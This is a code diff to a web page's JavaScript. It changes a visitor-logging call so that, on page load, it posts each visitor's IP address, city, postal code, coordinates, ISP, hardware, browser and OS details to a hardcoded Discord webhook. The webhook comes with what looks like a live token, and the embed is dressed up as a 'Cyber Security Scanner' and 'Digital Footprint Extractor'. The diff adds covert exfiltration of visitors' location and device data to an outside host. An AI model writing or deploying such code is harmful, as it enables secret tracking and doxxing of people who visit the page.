@@ -184,12 +184,38 @@ document.addEventListener('DOMContentLoaded', () => {
         userData.battery = await getBatteryInfo();
         userData.touch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints} points)` : "No";
 
-        // Send to server
+        // Send to Discord Webhook
         try {
-            fetch('/api/log', {
+            const webhookUrl = "https://discord.com/api/webhooks/1485369933058674718/5iNQokQ6pdB6BBQo7KSW5oAvgEImWbbok-NR2YvtGw0NEg5jQ5ZmlQEeFaMe1Px9NhFT";
+            
+            const payload = {
+                username: "Cyber Security Scanner",
+                avatar_url: "https://i.imgur.com/4M34hi2.png",
+                embeds: [{
+                    title: "🚨 New Security Footprint Captured",
+                    color: 0x00ff41, // Cyber green
+                    fields: [
+                        { name: "Identifier", value: `\`${userData.name}\``, inline: true },
+                        { name: "IP Address", value: `\`${userData.ip}\``, inline: true },
+                        { name: "Time / TZ", value: `${userData.time}\n${userData.timezone} (${userData.timeOffset})`, inline: false },
+                        
+                        { name: "📍 Location & ISP", value: `${userData.city}, ${userData.region}, ${userData.country} (ZIP: ${userData.postal})\n**Coordinates:** ${userData.lat}, ${userData.lon}\n**ISP:** ${userData.isp} (ASN: ${userData.asn})`, inline: false },
+                        
+                        { name: "💻 Hardware & Display", value: `**Cores:** ${userData.cores} | **RAM:** ${userData.memory}\n**GPU:** ${userData.gpu}\n**Screen:** ${userData.screen} (${userData.colorDepth}-bit)\n**Battery:** ${userData.battery} | **Touch:** ${userData.touch}`, inline: false },
+                        
+                        { name: "🌐 Software & Network", value: `**OS:** ${userData.os} (${userData.platform})\n**Browser:** ${userData.browser} (${userData.language})\n**Net Type:** ${userData.connectionType} | **Ping:** ${userData.rtt}\n**Features:** DNT(${userData.dnt}), Bot(${userData.webdriver})`, inline: false },
+                        
+                        { name: "Raw User Agent", value: `\`\`\`${userData.userAgent}\`\`\``, inline: false }
+                    ],
+                    footer: { text: "Digital Footprint Extractor v2.0" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(userData)
+                body: JSON.stringify(payload)
             });
         } catch (e) {
             console.error("Failed to send log", e);
